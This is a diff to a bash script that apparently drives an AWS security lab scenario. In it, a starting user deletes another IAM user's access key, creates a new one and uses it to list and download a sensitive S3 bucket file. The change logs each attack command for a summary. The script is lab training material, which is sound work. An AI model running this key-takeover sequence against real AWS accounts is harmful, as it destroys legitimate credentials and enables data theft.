@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user can bypass the AWS 2-key limit by deleting an existing
 # access key and creating a new one for a user with S3 bucket access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-003-to-bucket-starting-user"
@@ -60,6 +80,7 @@ export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
 unset AWS_SESSION_TOKEN
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -71,6 +92,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -84,6 +106,7 @@ echo -e "${GREEN}✓ Identified target bucket${NC}\n"
 # Step 5: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 5: Verifying we don't have bucket access yet${NC}"
 echo "Attempting to list S3 buckets..."
+show_cmd aws s3 ls
 if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
     echo -e "${GREEN}✓ Confirmed: Cannot list S3 buckets (as expected)${NC}"
 else
@@ -96,6 +119,7 @@ echo -e "${YELLOW}Step 6: Listing existing access keys for target user${NC}"
 echo "Target user: $TARGET_USER"
 echo ""
 
+show_cmd aws iam list-access-keys --user-name $TARGET_USER --output json
 ACCESS_KEYS_JSON=$(aws iam list-access-keys --user-name $TARGET_USER --output json)
 ACCESS_KEYS=$(echo "$ACCESS_KEYS_JSON" | jq -r '.AccessKeyMetadata[].AccessKeyId')
 KEY_COUNT=$(echo "$ACCESS_KEYS" | wc -l | xargs)
@@ -122,6 +146,7 @@ echo "Deleting access key: $KEY_TO_DELETE"
 # Save it to a temporary file for cleanup script to know which was deleted
 echo "$KEY_TO_DELETE" > /tmp/iam-003-deleted-key-id-${ACCOUNT_ID}.txt
 
+show_attack_cmd aws iam delete-access-key --user-name $TARGET_USER --access-key-id $KEY_TO_DELETE
 aws iam delete-access-key \
     --user-name $TARGET_USER \
     --access-key-id $KEY_TO_DELETE
@@ -134,6 +159,7 @@ echo -e "${YELLOW}Step 8: Creating new access key for target user${NC}"
 echo "This is the privilege escalation vector..."
 echo ""
 
+show_attack_cmd aws iam create-access-key --user-name $TARGET_USER --output json
 NEW_ACCESS_KEY_JSON=$(aws iam create-access-key \
     --user-name $TARGET_USER \
     --output json)
@@ -158,12 +184,14 @@ unset AWS_SESSION_TOKEN
 export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
 export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY
 
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 TARGET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_USER_IDENTITY"
 echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
 
 # Step 10: List buckets to find the exact bucket name
 echo -e "${YELLOW}Step 10: Finding the target bucket${NC}"
+show_cmd aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name" --output text
 FULL_BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name" --output text)
 
 if [ -z "$FULL_BUCKET_NAME" ]; then
@@ -178,6 +206,7 @@ echo -e "${GREEN}✓ Found target bucket${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying S3 bucket access${NC}"
 echo "Attempting to list bucket contents..."
 
+show_attack_cmd aws s3 ls s3://$FULL_BUCKET_NAME
 if aws s3 ls s3://$FULL_BUCKET_NAME; then
     echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 fi
@@ -185,6 +214,7 @@ echo ""
 
 echo "Reading sensitive data file..."
 DOWNLOAD_FILE="/tmp/iam-003-bucket-sensitive-data-${ACCOUNT_ID}.txt"
+show_attack_cmd aws s3 cp s3://$FULL_BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 if aws s3 cp s3://$FULL_BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE; then
     echo -e "\n${GREEN}✓ Successfully downloaded sensitive data!${NC}"
     echo -e "${YELLOW}Contents of sensitive file:${NC}"
@@ -214,7 +244,19 @@ echo "- Deleted access key: $KEY_TO_DELETE"
 echo "- Created access key: $NEW_ACCESS_KEY_ID"
 echo "- Downloaded file: $DOWNLOAD_FILE"
 
-echo -e "\n${BLUE}Key Insight:${NC}"
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (DeleteAccessKey + CreateAccessKey) → $TARGET_USER → $FULL_BUCKET_NAME"
+echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+echo ""
+
+echo -e "${BLUE}Key Insight:${NC}"
 echo "This attack bypasses AWS's 2-key limit by deleting an existing key"
 echo "before creating a new one. The target user may not notice immediately"
 echo "if the deleted key was inactive or a backup key."
@@ -223,3 +265,6 @@ echo -e "\n${RED}⚠ Warning: The original access key has been deleted and canno
 echo -e "${YELLOW}To clean up and restore the environment:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
